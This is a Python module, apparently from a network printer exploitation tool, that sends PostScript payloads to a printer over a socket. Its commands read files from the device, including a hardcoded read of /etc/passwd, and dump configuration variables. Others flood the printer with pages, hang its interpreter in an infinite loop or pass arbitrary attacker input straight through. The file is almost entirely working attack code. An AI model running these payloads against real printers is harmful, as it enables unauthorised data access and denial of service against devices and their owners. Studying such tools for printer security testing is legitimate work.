# File: pret/modules/ps.py
import socket

class PSModule:
    def __init__(self, connection):
        self.connection = connection

    def send_payload(self, payload):
        self.connection.sendall(payload.encode('utf-8'))
        data = b""
        self.connection.settimeout(2)
        try:
            while True:
                chunk = self.connection.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        return data.decode('latin1', errors='ignore')

    def run(self, cmd):
        if cmd == "status":
            payload = """
                statusdict begin
                /product get ==
                /printername where { pop printername == } if
                /manualfeed where { pop manualfeed == } if
                end
                showpage
            """

        elif cmd == "variables":
            payload = """
                userdict begin
                /DEVICE known { DEVICE == } if
                /SERVER known { SERVER == } if
                /JobTimeout known { JobTimeout == } if
                end
                showpage
            """

        elif cmd.startswith("readfile "):
            filename = cmd.replace("readfile ", "").strip()
            payload = f"""
                ({filename}) (r) file dup 512 string readline pop ==
                showpage
            """

        elif cmd == "id":
            payload = """
                statusdict /product get ==
                showpage
            """

        elif cmd == "readfile test":
            payload = """(/etc/passwd) (r) file dup 100 string readline pop ="""
        elif cmd == "dos1":
            payload = """
                /Helvetica findfont 30 scalefont setfont
                0 700 moveto
                0 1 50 {
                    dup 20 mul 100 moveto
                    (!!!PRINTERREAPER!!!) show
                    showpage
                } for
            """
        elif cmd == "loop":
            payload = """{ (LOOP) = } loop"""
        elif cmd == "wipe":
            payload = """initgraphics erasepage showpage"""
        else:
            payload = cmd

        raw = self.send_payload(payload)
        print("[RAW OUTPUT]")
        print(raw)
        return raw